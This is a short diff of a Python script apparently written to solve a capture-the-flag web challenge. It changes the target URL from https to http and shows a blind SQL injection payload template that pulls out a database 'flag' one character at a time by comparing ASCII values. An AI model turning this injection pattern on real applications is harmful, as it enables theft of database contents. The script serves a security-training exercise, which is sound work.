@@ -2,7 +2,7 @@
 # -*- encoding: utf-8 -*-
 import requests
 
-URL = "https://challenges.unitedctf.ca:18000/challenge3.php"
+URL = "http://challenges.unitedctf.ca:18000/challenge3.php"
 HEADERS = {}
 
 query = "' OR ASCII(SUBSTRING(flag, {}, 1)) > {} -- " # Placeholders are for Position and ascii value respectively
